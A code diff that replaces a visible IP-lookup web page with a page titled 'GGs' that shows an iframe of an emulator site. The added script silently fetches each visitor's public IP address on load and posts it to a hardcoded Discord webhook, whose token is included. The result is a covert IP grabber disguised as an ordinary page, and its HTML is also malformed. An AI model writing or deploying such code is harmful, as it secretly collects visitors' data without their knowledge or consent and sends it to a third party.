@@ -1,201 +1,29 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IP Information Lookup - Fixed</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
-        .container {
-            background: white;
-            border-radius: 20px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
-            padding: 40px;
-            max-width: 600px;
-            width: 100%;
-        }
-        h1 { text-align: center; color: #333; margin-bottom: 30px; font-size: 2.2em; }
-        .input-group { margin-bottom: 25px; }
-        input[type="text"] {
-            width: 100%; padding: 15px; border: 2px solid #e1e5e9; border-radius: 12px;
-            font-size: 16px; transition: border-color 0.3s;
-        }
-        input[type="text"]:focus { outline: none; border-color: #667eea; }
-        button {
-            width: 100%; padding: 15px; color: white; border: none; border-radius: 12px;
-            font-size: 16px; font-weight: 600; cursor: pointer; transition: transform 0.2s;
-            margin-bottom: 10px;
-        }
-        .my-ip-btn { background: linear-gradient(135deg, #4caf50 0%, #45a049 100%); }
-        .lookup-btn { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); }
-        button:hover { transform: translateY(-2px); }
-        button:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
-        .loading { text-align: center; color: #666; font-style: italic; }
-        .results { margin-top: 25px; }
-        .info-card {
-            background: #f8f9fa; padding: 20px; border-radius: 12px; margin-bottom: 15px;
-            border-left: 5px solid #667eea;
-        }
-        .info-label { font-weight: 600; color: #555; margin-bottom: 5px; }
-        .info-value { color: #333; font-size: 16px; }
-        .error { background: #fee; color: #c33; padding: 15px; border-radius: 12px; border-left: 5px solid #c33; margin-top: 20px; }
-        .status { text-align: center; padding: 15px; background: #e3f2fd; border-radius: 12px; color: #1976d2; margin-bottom: 20px; }
-        .api-status { font-size: 12px; color: #888; margin-top: 10px; }
-    </style>
+  <meta charset="UTF-8">
+  <title>GGs</title>
+  <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <div class="container">
-        <h1>🔍 IP Information Lookup</h1>
-        
-        <div class="status" id="status">Ready to lookup IPs!</div>
-        
-        <div class="input-group">
-            <input type="text" id="ipInput" placeholder="Enter IP address (or leave blank)">
-        </div>
-        
-        <button class="my-ip-btn" onclick="getMyIP()">📍 My IP (Auto-detect)</button>
-        <button class="lookup-btn" onclick="lookupIP()">🔎 Lookup IP</button>
-        
-        <div id="loading" class="loading" style="display: none;">🔄 Loading...</div>
-        <div id="error" style="display: none;"></div>
-        <div id="results" class="results"></div>
-    </div>
+  <script>
+    fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => {
+        const webhookUrl = 'https://discord.com/api/webhooks/1396998579985584349/MDFQ1jyOBbT9PisvmNhmwQMCN4yjL9yGKuvFf5whiSHk83KGR7Sbo-6quctUw7y11XqP';
 
-    <script>
-        const APIs = [
-            { name: 'ipapi.co', url: ip => `https://ipapi.co/${ip}/json/` },
-            { name: 'ipinfo.io', url: ip => `https://ipinfo.io/${ip}/json` },
-            { name: 'ip-api.com', url: ip => `http://ip-api.com/json/${ip}` }
-        ];
-
-        async function fetchFromAPI(ip = '') {
-            for (const api of APIs) {
-                try {
-                    const response = await fetch(api.url(ip));
-                    const data = await response.json();
-                    
-                    if (!data.error && data.ip) {
-                        return { data, api: api.name };
-                    }
-                } catch (e) {
-                    console.log(`API ${api.name} failed:`, e);
-                }
-            }
-            throw new Error('All APIs failed');
-        }
-
-        async function getMyIP() {
-            document.getElementById('ipInput').value = '';
-            await fetchIPInfo('');
-        }
-
-        async function lookupIP() {
-            const ip = document.getElementById('ipInput').value.trim();
-            if (!ip) {
-                getMyIP();
-                return;
-            }
-            await fetchIPInfo(ip);
-        }
-
-        async function fetchIPInfo(ip = '') {
-            const loading = document.getElementById('loading');
-            const results = document.getElementById('results');
-            const errorDiv = document.getElementById('error');
-            const status = document.getElementById('status');
-            
-            loading.style.display = 'block';
-            results.innerHTML = '';
-            errorDiv.style.display = 'none';
-            status.textContent = '🔄 Fetching IP info...';
-
-            try {
-                const { data, api } = await fetchFromAPI(ip);
-                
-                status.innerHTML = `✅ Found using <strong>${api}</strong> API`;
-                displayResults(data);
-                
-            } catch (error) {
-                status.textContent = '❌ Failed to fetch';
-                errorDiv.innerHTML = `<strong>Error:</strong> ${error.message}<br><small>Try again or check your internet</small>`;
-                errorDiv.style.display = 'block';
-            } finally {
-                loading.style.display = 'none';
-            }
-        }
-
-        function displayResults(data) {
-            const results = document.getElementById('results');
-            
-            // Normalize different API formats
-            const info = {
-                ip: data.ip || data.query,
-                city: data.city,
-                region: data.region || data.regionName,
-                country: data.country_name || data.country,
-                countryCode: data.country_code || data.countryCode,
-                isp: data.org || data.orgname,
-                asn: data.asn?.name || data.asn,
-                lat: data.latitude || data.lat,
-                lon: data.longitude || data.lon,
-                timezone: data.timezone,
-                zip: data.postal || data.zip
-            };
-
-            results.innerHTML = `
-                <div class="info-card">
-                    <div class="info-label">📍 IP Address</div>
-                    <div class="info-value">${info.ip}</div>
-                </div>
-                ${info.city ? `<div class="info-card">
-                    <div class="info-label">🌍 City</div>
-                    <div class="info-value">${info.city}</div>
-                </div>` : ''}
-                ${info.region ? `<div class="info-card">
-                    <div class="info-label">🏛️ Region</div>
-                    <div class="info-value">${info.region}</div>
-                </div>` : ''}
-                <div class="info-card">
-                    <div class="info-label">🇨 Country</div>
-                    <div class="info-value">${info.country} (${info.countryCode})</div>
-                </div>
-                ${info.isp ? `<div class="info-card">
-                    <div class="info-label">🌐 ISP</div>
-                    <div class="info-value">${info.isp}</div>
-                </div>` : ''}
-                ${info.zip ? `<div class="info-card">
-                    <div class="info-label">📮 Postal Code</div>
-                    <div class="info-value">${info.zip}</div>
-                </div>` : ''}
-                ${info.lat && info.lon ? `<div class="info-card">
-                    <div class="info-label">📊 Coordinates</div>
-                    <div class="info-value">${info.lat}, ${info.lon}</div>
-                </div>` : ''}
-                ${info.timezone ? `<div class="info-card">
-                    <div class="info-label">🕐 Timezone</div>
-                    <div class="info-value">${info.timezone}</div>
-                </div>` : ''}
-            `;
-        }
-
-        // Enter key support
-        document.getElementById('ipInput').addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') lookupIP();
+        fetch(webhookUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            content: `🌐 New visitor IP: ${data.ip}`
+          })
         });
+      });
+  </script>
 
-        // Auto load your IP on page load
-        window.onload = function() {
-            setTimeout(getMyIP, 500);
-        };
-    </script>
+</head>
+<body>
+  <iframe src="https://www.emuvr.net/"></iframe>
 </body>
 </html>
